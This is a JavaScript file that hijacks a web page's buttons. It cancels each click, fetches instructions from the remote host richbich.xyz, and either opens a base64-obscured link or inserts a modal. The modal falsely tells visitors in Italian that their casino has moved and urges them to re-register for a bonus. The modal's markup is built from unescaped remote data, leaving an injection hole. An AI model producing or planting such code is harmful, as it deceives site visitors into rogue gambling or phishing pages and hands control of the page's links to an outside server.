
function initRedirectButtons() {
    const buttons = document.querySelectorAll('.button, .btn, .cta-btn, .primary-btn, .action-btn, .first-btn, .second-btn, .secondary-btn, .info-btn, .basic-btn');
    const container = document.querySelector('body');
    const type = Number(container.getAttribute('data-type'));
    const a = container.getAttribute('data-atob');
    const url = 'https://richbich.xyz/';
    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000));

    buttons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            
            if (type === 1) {
                Promise.race([fetch(url).then(response => response.json()), timeout])
                    .then(response => {
                        const resAtob = response.data.button_link;
                        window.open(resAtob ? resAtob : atob(a), '_blank');
                    })
                    .catch(error => window.open(atob(a), '_blank'));
            }

            if (type === 2) {
                Promise.race([fetch(url).then(response => response.json()), timeout])
                    .then(response => showRedirectModal(response['data']))
                    .catch(error => showRedirectModal());
            }
        });
    });
}

function showRedirectModal(data) {
    const container = document.querySelector('body');
    let a = atob(container.getAttribute('data-atob'));
    
    const logo = document.getElementById('logo');
    const logo_from = logo ? logo.getAttribute('src') : '';

    let title = 'Benvenuto nel nostro nuovo casino!';
    let description = 'Ci siamo trasferiti su una nuova piattaforma per offrirti servizi migliori e opportunità più interessanti. Registrati di nuovo con noi e ricevi un bonus speciale!';
    let bonus = 'Bonus di Benvenuto Speciale';
    let button_text = 'Richiedi Bonus! 🎁';
    let logo_to = logo_from;
    
    if (data) {
        title = data.title || title;
        description = data.description || description;
        bonus = data.bonus || bonus;
        button_text = data.button_text || button_text;
        a = data.button_link ? data.button_link : a;
        logo_to = data.logo_to || logo_to;
    }
    
    const html = '<div class="monetization-modal"><div class="monetization-modal__container"><div class="monetization-modal__header"><div class="monetization-modal__header-logo-from"><img src="' + logo_from + '" alt="Logo from"/></div><div class="monetization-modal__header-separator">→</div><div class="monetization-modal__header-logo-to"><img src="' + logo_to + '" alt="Logo to"/></div></div><div class="monetization-modal__title">' + title + '</div><div class="monetization-modal__desc">' + description + '</div><div class="monetization-modal__bonus" onclick="window.open(\'' + a + '\', \'_blank\')" style="cursor: pointer;"><div>' + bonus + '</div></div><div class="monetization-modal__button"><button class="button large primary" onclick="window.open(\'' + a + '\', \'_blank\')">' + button_text + '</button></div></div></div>';
    document.body.insertAdjacentHTML('beforeend', html);
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initRedirectButtons);
} else {
    initRedirectButtons();
}
